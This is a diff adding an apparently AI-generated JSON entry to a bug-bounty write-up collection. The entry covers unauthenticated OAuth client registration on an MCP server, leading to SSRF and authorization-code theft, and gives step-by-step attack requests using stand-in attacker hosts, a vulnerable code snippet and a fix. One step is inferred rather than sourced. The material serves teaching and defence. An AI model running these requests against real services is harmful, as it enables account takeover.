@@ -1,5 +1,47 @@
 [
   {
+    "id": "d248f2ae9bda",
+    "title": "Exposed MCP Server: From Recon to OAuth Security Flaws",
+    "url": "https://scriptjacker.medium.com/exposed-mcp-server-from-recon-to-oauth-security-flaws-8c40084e0e6d",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Parth Narula"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-16T16:20:05.000Z",
+    "added_at": "2026-10-17T10:49:00.644Z",
+    "categories": [
+      "oauth-jwt",
+      "ssrf",
+      "auth-bypass"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "The MCP service allowed anyone to register an OAuth client without authentication and without validating the redirect_uri, resulting in an open‑redirect and SSRF that can be used to steal authorization codes.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause is a missing authentication check on the dynamic client registration endpoint (POST /mcp/register), allowing unauthenticated users to create clients. The server also fails to validate the \"redirect_uris\" parameter, so any attacker‑controlled URL is accepted. Because the redirect_uri is later used by the authorization endpoint without verification, the service performs an open redirect. Additionally, the backend fetches the supplied URL during registration, causing a server‑side request forgery (SSRF). These flaws stem from trusting user‑provided data without proper sanitisation or access control.",
+      "walkthrough": "RECON\nStep 1: Open the base MCP URL in a browser.\nGET https://REDACTED/mcp\nWhy: An HTTP request (a message sent to a server) returns a simple JSON response showing the service is alive.\nStep 2: Run dirsearch (a directory‑brute‑forcing tool) against the host.\nGET https://REDACTED/dirsearch_output.txt\nWhy: The tool enumerates hidden paths; it discovered an \"/examples/\" directory.\nStep 3: Browse the discovered sitemap file.\nGET https://REDACTED/examples/sitemap.xml\nWhy: A sitemap (XML file) often lists internal URLs; it revealed \"/examples/api-reference.html\".\nStep 4: Open the API reference page.\nGET https://REDACTED/examples/api-reference.html\nWhy: The page documents all HTTP endpoints, including the OAuth flow.\n\nDISCOVERY\nStep 5: Locate the client‑registration endpoint in the docs.\nPOST /mcp/register\nWhy: The documentation shows the HTTP method (POST) and path; this endpoint creates OAuth clients.\nStep 6: Note the \"redirect_uris\" parameter definition (an array of URLs).\nWhy: A parameter is a piece of data sent to the server; here it tells the auth server where to send users after login.\n\nEXPLOITATION\nStep 7: Craft a registration request with a domain you control (Burp Collaborator).\nPOST /mcp/register HTTP/2\nHost: REDACTED\nContent-Type: application/json\n\n{\"client_name\":\"My AI App\",\"redirect_uris\":[\"https://COLLABORATOR.example/\"]}\nWhy: This payload (the body of the request) registers a new client; no authentication is required, so anyone can send it.\nStep 8: Send the request and receive a 201 Created response.\nHTTP/2 201 Created\n{\"client_id\":\"REDACTED\",\"client_secret\":\"REDACTED\",\"redirect_uris\":[\"https://COLLABORATOR.example/\"]}\nWhy: The server accepted the unvalidated redirect_uri and returned credentials.\nStep 9: Observe DNS and HTTP interactions on the Collaborator domain.\nGET / HTTP/1.1\\nHost: COLLABORATOR.example\nWhy: The server fetched the supplied URL, proving an SSRF (server‑side request forgery) where the backend makes outbound requests to attacker‑controlled hosts.\nStep 10: Build an authorization request using the new client_id and redirect_uri.\nGET /mcp/authorize?response_type=code&client_id=REDACTED&redirect_uri=https://COLLABORATOR.example/&scope=openid&state=TEST&code_challenge=REDACTED&code_challenge_method=S256\nWhy: This HTTP GET (request) starts the OAuth flow; the redirect_uri is again unchecked, so the user is sent to the attacker domain.\nStep 11: Open the URL in a browser and watch the redirect.\nBrowser navigates to https://COLLABORATOR.example/?code=...&state=TEST\nWhy: The open redirect leaks the authorization code to the attacker, enabling token exchange.\n\nIMPACT\nStep 12: Use the captured code to request an access token (not shown in article but implied).\nPOST /mcp/token with code=...&client_id=REDACTED&client_secret=REDACTED\nWhy: With the code, an attacker can obtain a JWT (JSON Web Token) and act as the victim user.",
+      "example": "Assume a fictional service at https://target.example that offers OAuth client registration at POST /oauth/register. The server code (vulnerable) simply stores the supplied \"redirect_uris\" array without checks:\n\n```python\n# vulnerable snippet\ndata = json.loads(request.body)\nclient_id = generate_id()\nstore[client_id] = {\n    \"redirect_uris\": data.get(\"redirect_uris\", []),\n    \"secret\": generate_secret()\n}\nreturn json.dumps({\"client_id\": client_id, \"client_secret\": store[client_id][\"secret\"]})\n```\nAn attacker sends:\n\nPOST /oauth/register HTTP/1.1\nHost: target.example\nContent-Type: application/json\n\n{\"client_name\":\"evil\",\"redirect_uris\":[\"https://attacker.example/cb\"]}\n\nThe server replies with a new client_id and secret. Later, the attacker initiates:\n\nGET /oauth/authorize?response_type=code&client_id=123&redirect_uri=https://attacker.example/cb&state=xyz\n\nThe service redirects the user to https://attacker.example/cb?code=...&state=xyz, leaking the code. Because the redirect_uri was never validated, the attack works. The same flaw also causes the server to request https://attacker.example during registration, demonstrating SSRF.",
+      "takeaway": "When you see an unauthenticated client‑registration endpoint, assume the redirect_uri may be unchecked. Look for \"redirect_uris\" or similar parameters in OAuth docs and test with a domain you control. Tools like Burp Collaborator or dnslog can confirm out‑bound requests (SSRF) and redirects. Variants include open‑redirects in SAML ACS URLs or OpenID Connect \"post_logout_redirect_uri\". Beginners often forget to check whether the server validates the URL scheme or domain, leading to false‑negative results.",
+      "fix": "Add authentication (e.g., API key or admin token) to the client‑registration endpoint so only trusted parties can create clients. Validate each supplied redirect_uri against a whitelist of allowed domains and enforce HTTPS. Reject URLs that contain IP addresses, localhost, or unknown hosts. When processing redirect_uri, compare it to the stored whitelist and return an error if it does not match. Example fix in pseudo‑code:\n\n```python\nif not user_is_authorized(request):\n    return 403\nfor uri in data[\"redirect_uris\"]:\n    if not is_allowed_uri(uri):\n        return 400\nstore_client(data)\n```\nThis prevents open redirects and stops the server from fetching attacker‑controlled URLs, eliminating the SSRF vector.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Hey Hackers, I am Parth Narula. A penetration tester, bug hunter, red teamer and overall a security researcher. I live for those moments where a bit of thinking outside the box leads to an interesting security finding. _I am starting a series of the bugs that I found in the services and functionalities related to AI in the applications._ This time, I was doing reconnaissance on `REDACTED` when I came across an MCP service. What started with a simple JSON response eventually led me to exposed API documentation, OAuth client registration, and some unexpected redirect behavior. During my reconnai",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "5f0cdc262a81",
     "title": "I found a secret door into an admin panel — and got paid $1350 for it",
     "url": "https://medium.com/@dhruv.gup707/i-found-a-secret-door-into-an-admin-panel-and-got-paid-1350-for-it-bb170e9974b0",
